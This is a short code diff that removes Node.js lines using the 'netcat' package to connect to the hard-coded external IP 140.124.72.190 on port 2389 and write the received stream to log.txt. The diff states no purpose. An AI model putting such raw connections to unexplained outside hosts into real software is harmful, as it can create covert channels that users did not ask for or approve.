@@ -1,6 +1,0 @@
-const NetcatServer = require('netcat/server')
-const NetcatClient = require('netcat/client')
-const nc = new NetcatServer()
-const nc2 = new NetcatClient()
-const fs = require('fs')
-	nc2.addr('140.124.72.190').port(2389).connect().pipe(fs.createWriteStream('log.txt'))
